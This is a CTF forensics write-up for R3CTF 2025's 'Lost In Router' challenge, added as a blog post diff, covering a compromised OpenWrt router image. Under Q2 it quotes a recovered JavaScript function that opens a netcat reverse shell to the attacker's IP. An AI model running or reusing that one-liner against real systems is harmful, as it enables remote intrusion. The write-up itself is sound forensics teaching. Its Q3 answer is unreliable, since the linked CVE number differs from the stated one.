@@ -1,0 +1,162 @@
+---
+layout: post
+title: "R3CTF25 - DFIR I Lost In Router"
+date: 2025-07-1 15:21:27 +0530
+categories: ctf
+description: DFIR I Lost In Router R3CTF 2025
+media_subpath: /assets/postimg/R3CTF25/
+image: R3CTF25.png
+path: R3CTF25.png
+alt: "R3CTF - 2025"
+---
+
+## DFIR 2025 Ⅰ: Lost In Router [Forensics]
+
+**Solves:** 23
+
+#### Description
+
+```
+
+You are a staff member at a company. Today, when you opened your company's internal website, a notification prompted you to update your browser. After downloading the file from the website, nothing happened. Subsequently, you learned from the IT department that the company's router had been hacked.
+
+```
+
+### Flag 
+
+```
+R3CTF{1_H0P3-hACKER_nO7-HAck3D-my_pc_bUT_mY_@n7IVIru5_P20gr4m_I5_w4rnIng_hope_1_wonT_f123d_tOm0220w_30}
+```
+
+### Solve
+
+
+### Qs1
+```
+  1 What is the OS version of the router?  
+```
+
+### solution
+
+Given is a disk image which can be viewed with `FTK imager` or `Autopsy`
+![alt text](image.png)
+
+the answer for the first question can be found in the file
+
+```
+etc/openwrt_release
+```
+to get the answer for the fisrt qs as 
+```
+23.05.4
+```
+
+### Qs2
+```
+Q2) What is the IP address of the attacker's machine?
+Example: 114.51.41.91
+```
+### solution
+
+on checking the path      
+```
+root/subconverter/cache/dad176d5807526bf19069ecce4f14bfe
+```
+we see 
+![alt text](image-1.png)
+
+```
+
+function parse(x) {
+        os.exec([ "sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 156.238.233.47 31426 >/tmp/f" ], { file: "sh" })
+}
+
+
+```
+and from this we get the solution for the second qs
+  
+```
+156.238.233.47
+```
+
+### Qs3
+
+```
+Q3) What is the CVE number of the vulnerability exploited by the attacker?
+Example: CVE‑2025‑32463
+```
+
+### solution
+
+On searching for the CVE related to the acquired artefacts like the file downloaded in root ![alt text](image-4.png) 
+we try thIS https://nvd.nist.gov/vuln/detail/CVE-2022-2892
+
+which is the solution for the 3rd qs
+
+```
+CVE-2022-28927
+```
+
+### Qs4
+```
+Q4) What program's configuration was modify by the attacker to do persistence?
+Example: rsyncd
+```
+### solution
+
+we see dropbear keys and use in etc/config giving us a doubt on dropbear and that was right for ssh connection for persistance
+![alt text](image-2.png)
+
+```
+dropbear
+```
+### Qs5
+
+```
+
+Q5) What is the host hijacked by the attacker?
+Example: dashboard.company.com
+```
+
+### solution
+
+On analysing the the dhcp data in the path
+```
+/etc/config/dhcp
+```
+we see the host 
+![alt text](image-3.png)
+
+giving us the answer for this qs as
+
+```
+portal.r3.internal
+```
+### Qs6
+```
+Q6) What host did the attacker use to host malicious artifacts?
+Example: foo-bar-deadbe.varcel.app
+
+```
+from the path www/ we see a index.html which loads the js file in 
+```
+/luci-static/bootstrap/bootstrap.min.js
+```
+On analysing the file and then deobfuscating it we see 
+```
+var version_ = 'jsjiami.com.v7'
+```
+now searching for tools to deobfuscate this we come across this tool to deobfuscate it and get the final solution and flag :https://github.com/jscck/ob-jsjiami
+```
+https://nimble-bonbon-d941a8.netlify.app/
+```
+
+![alt text](image-5.png)
+
+##FLAG
+```
+R3CTF{1_H0P3-hACKER_nO7-HAck3D-my_pc_bUT_mY_@n7IVIru5_P20gr4m_I5_w4rnIng_hope_1_wonT_f123d_tOm0220w_30}
+```
+
+
+
